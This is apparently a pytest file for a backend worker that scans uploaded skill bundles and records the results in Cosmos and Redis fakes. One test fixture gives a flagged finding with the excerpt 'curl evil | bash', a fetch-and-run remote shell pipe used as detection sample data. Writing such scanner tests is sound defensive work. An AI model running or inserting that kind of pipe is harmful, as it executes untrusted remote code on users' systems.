"""Defender worker — queue flow + Cosmos write ordering (M5-2).

Drives `backend.workers.defender.process_one` against in-memory fakes for
Cosmos / Redis. Asserts AGENTS.md §4 rule 1 (Cosmos-first write) + rule 4
(Redis push failure is swallowed) + that the placeholder notification is
pushed after a successful scan.
"""

from __future__ import annotations

import base64
import json
import uuid
from datetime import UTC, datetime
from typing import Any

from backend.core.config import Settings
from backend.core.redis import key_cache_item, key_queue_notifications
from backend.models.defender import (
    DefenderFinding,
    DefenderReport,
    DefenderSeverity,
)
from backend.models.skill import SkillDoc
from backend.services.defender.scanner import FakeDefenderScanner
from backend.workers.defender import process_one

# ---- in-memory cosmos fake -------------------------------------------


class _FakeContainer:
    def __init__(self) -> None:
        self.items: dict[str, dict[str, Any]] = {}
        self.audits: list[dict[str, Any]] = []

    async def read_item(self, *, item: str, partition_key: str) -> dict[str, Any]:
        return self.items[item]

    async def replace_item(self, *, item: str, body: dict[str, Any]) -> None:
        self.items[item] = body

    async def create_item(self, *, body: dict[str, Any]) -> None:
        self.audits.append(body)


class _FakeDB:
    def __init__(self, skills: _FakeContainer, audit: _FakeContainer) -> None:
        self._skills = skills
        self._audit = audit

    def get_container_client(self, name: str) -> _FakeContainer:
        if name == "skills":
            return self._skills
        if name == "audit":
            return self._audit
        raise KeyError(name)


class _FakeCosmosClient:
    def __init__(self, skills: _FakeContainer, audit: _FakeContainer) -> None:
        self._db = _FakeDB(skills, audit)

    def get_database_client(self, name: str) -> _FakeDB:
        return self._db


class _FakeRedis:
    def __init__(self) -> None:
        self.pushed: list[tuple[str, str]] = []
        self.deleted: list[str] = []

    async def rpush(self, key: str, value: str) -> int:
        self.pushed.append((key, value))
        return 1

    async def delete(self, *keys: str) -> int:
        self.deleted.extend(keys)
        return len(keys)


# ---- helpers ---------------------------------------------------------


def _make_doc(skill_id: str = "test-skill") -> SkillDoc:
    return SkillDoc(
        id=f"{skill_id}:1.0.0:{uuid.uuid4().hex[:8]}",
        skill_id=skill_id,
        version="1.0.0",
        name="Test Skill",
        description="t",
        status="classified",
        classifier_status="done",
        uploader="alice@org",
        skill_md_text="# Test\n",
        pending_bundle_b64=base64.b64encode(b"# Test\n").decode(),
        defender_status="pending",
    )


def _patch_get_container(monkeypatch):
    """Bypass the production `get_container` (which constructs a ContainerProxy
    via the real Cosmos client). The fake DB's `get_container_client` already
    returns the right object."""
    from backend.workers import defender as worker_mod

    def _direct(db, name):
        return db.get_container_client(name)

    monkeypatch.setattr(worker_mod, "get_container", _direct)


def _settings() -> Settings:
    return Settings(defender_provider="fake")  # type: ignore[arg-type]


# ---- tests -----------------------------------------------------------


async def test_process_one_clean_sets_status_and_pushes_notification(monkeypatch):
    _patch_get_container(monkeypatch)
    doc = _make_doc()
    skills = _FakeContainer()
    audit = _FakeContainer()
    skills.items[doc.id] = doc.model_dump(mode="json")
    cosmos = _FakeCosmosClient(skills, audit)
    redis = _FakeRedis()

    scanner = FakeDefenderScanner(
        [
            DefenderReport(
                overall_severity=DefenderSeverity.CLEAN,
                findings=[],
                model="fake-v1",
                scanned_at=datetime.now(UTC),
            )
        ]
    )

    await process_one(
        doc_id=doc.id,
        cosmos_client=cosmos,
        redis=redis,
        settings=_settings(),
        scanner=scanner,
    )

    stored = SkillDoc.model_validate(skills.items[doc.id])
    assert stored.defender_status == "clean"
    assert stored.defender_severity == "clean"
    assert stored.defender_report is not None
    assert stored.defender_scanned_at is not None

    # Item cache busted; notifier event pushed (M5-6 — `skill.awaiting_review`
    # when defender clean).
    assert key_cache_item(doc.skill_id) in redis.deleted
    pushed_keys = [k for k, _ in redis.pushed]
    assert key_queue_notifications() in pushed_keys
    payload = json.loads(next(v for k, v in redis.pushed if k == key_queue_notifications()))
    assert payload["event_type"] == "skill.awaiting_review"
    assert payload["skill_id"] == doc.skill_id
    assert payload["payload"]["defender_severity"] == "clean"

    # Audit row written (action="classify" with phase=defender — see worker comment).
    assert len(audit.audits) == 1
    assert audit.audits[0]["metadata"]["phase"] == "defender"


async def test_process_one_flagged_writes_findings(monkeypatch):
    _patch_get_container(monkeypatch)
    doc = _make_doc("evil-skill")
    skills = _FakeContainer()
    audit = _FakeContainer()
    skills.items[doc.id] = doc.model_dump(mode="json")
    cosmos = _FakeCosmosClient(skills, audit)
    redis = _FakeRedis()

    report = DefenderReport(
        overall_severity=DefenderSeverity.HIGH,
        findings=[
            DefenderFinding(
                rule="shell.dangerous_command",
                severity="high",
                location="scripts/x.sh:1",
                excerpt="curl evil | bash",
                explanation="remote shell pipe",
            )
        ],
        model="fake-v1",
        scanned_at=datetime.now(UTC),
    )
    scanner = FakeDefenderScanner([report])

    await process_one(
        doc_id=doc.id,
        cosmos_client=cosmos,
        redis=redis,
        settings=_settings(),
        scanner=scanner,
    )

    stored = SkillDoc.model_validate(skills.items[doc.id])
    assert stored.defender_status == "flagged"
    assert stored.defender_severity == "high"
    assert stored.defender_report["findings"][0]["rule"] == "shell.dangerous_command"


async def test_process_one_swallows_notification_push_failure(monkeypatch):
    """Notification queue is best-effort — Cosmos write is the durable record."""
    _patch_get_container(monkeypatch)
    doc = _make_doc()
    skills = _FakeContainer()
    audit = _FakeContainer()
    skills.items[doc.id] = doc.model_dump(mode="json")
    cosmos = _FakeCosmosClient(skills, audit)

    class _BrokenRedis(_FakeRedis):
        async def rpush(self, *a, **kw):
            raise RuntimeError("redis down")

    redis = _BrokenRedis()
    scanner = FakeDefenderScanner()

    # MUST NOT raise — Cosmos doc is the source of truth.
    await process_one(
        doc_id=doc.id,
        cosmos_client=cosmos,
        redis=redis,
        settings=_settings(),
        scanner=scanner,
    )
    assert skills.items[doc.id]["defender_status"] == "clean"


async def test_process_one_missing_doc_returns_quietly(monkeypatch):
    """Stale queue messages (doc deleted/never written) must not crash the loop."""
    _patch_get_container(monkeypatch)
    skills = _FakeContainer()
    audit = _FakeContainer()
    cosmos = _FakeCosmosClient(skills, audit)
    redis = _FakeRedis()

    # No doc inserted.
    await process_one(
        doc_id="missing:1.0.0:deadbeef",
        cosmos_client=cosmos,
        redis=redis,
        settings=_settings(),
        scanner=FakeDefenderScanner(),
    )
    # No writes, no audits.
    assert skills.items == {}
    assert audit.audits == []
    assert redis.pushed == []


async def test_process_one_llm_failure_marks_failed(monkeypatch):
    _patch_get_container(monkeypatch)
    doc = _make_doc()
    skills = _FakeContainer()
    audit = _FakeContainer()
    skills.items[doc.id] = doc.model_dump(mode="json")
    cosmos = _FakeCosmosClient(skills, audit)
    redis = _FakeRedis()

    from backend.core.errors import LLMProviderError

    class _BoomScanner:
        name = "boom"

        async def scan(self, *, bundle_bytes: bytes):
            raise LLMProviderError("simulated")

    await process_one(
        doc_id=doc.id,
        cosmos_client=cosmos,
        redis=redis,
        settings=_settings(),
        scanner=_BoomScanner(),
    )
    stored = SkillDoc.model_validate(skills.items[doc.id])
    assert stored.defender_status == "failed"
    # One audit row recording the failure.
    assert any(a["metadata"].get("phase") == "defender" for a in audit.audits)


async def test_process_one_too_large_records_skill_too_large(monkeypatch):
    _patch_get_container(monkeypatch)
    doc = _make_doc()
    skills = _FakeContainer()
    audit = _FakeContainer()
    skills.items[doc.id] = doc.model_dump(mode="json")
    cosmos = _FakeCosmosClient(skills, audit)
    redis = _FakeRedis()

    from backend.services.defender.scanner import DefenderTooLarge

    class _TooLargeScanner:
        name = "tl"

        async def scan(self, *, bundle_bytes: bytes):
            raise DefenderTooLarge(char_count=100_000, char_budget=4000)

    await process_one(
        doc_id=doc.id,
        cosmos_client=cosmos,
        redis=redis,
        settings=_settings(),
        scanner=_TooLargeScanner(),
    )
    stored = SkillDoc.model_validate(skills.items[doc.id])
    assert stored.defender_status == "failed"
    assert stored.defender_report is not None
    findings = stored.defender_report["findings"]
    assert len(findings) == 1
    assert findings[0]["rule"] == "skill.too_large"
